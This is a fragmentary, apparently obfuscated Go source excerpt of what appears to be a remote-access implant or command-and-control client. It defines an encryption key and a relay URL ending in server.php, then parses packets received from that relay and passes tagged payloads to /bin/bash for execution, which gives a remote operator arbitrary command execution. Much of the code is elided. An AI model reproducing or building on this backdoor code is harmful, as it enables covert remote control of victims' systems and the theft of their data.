...
const(
	...
	obf_const_stream_tag = "is"
)

var(
	obf_var_encryption_key = []byte("00000000000000000000000000000000")
	obf_var_relay_address = "http://0.0.0.0:80/server.php"
...
func obf_func_exec(obf_var_shell_command string) []byte {
	obf_var_stdout, obf_var_e := exec.Command("bash", "-c", obf_var_shell_command).Output()
	if obf_var_e != nil {
		...
		if !obf_stream.obf_var_lock {
			...
			if obf_var_res != "" {
				...
				if strings.HasPrefix(obf_var_dec_res, "obf_tag_start_stream") {
					...
					obf_var_subshell := exec.Command( "/bin/bash", "-c", strings.Join(obf_var_split_packet[0:len(obf_var_split_packet) - 2], " ") )
			...
			for i := 0; i < len(obf_var_packet_list); i++ {
				...
				if obf_var_res != "" {
					...
					if strings.HasPrefix(obf_var_payload, "obf_tag_fetch_rate ") {
						...
						obf_var_shell := exec.Command("/bin/bash", "-c", obf_var_shell_command)
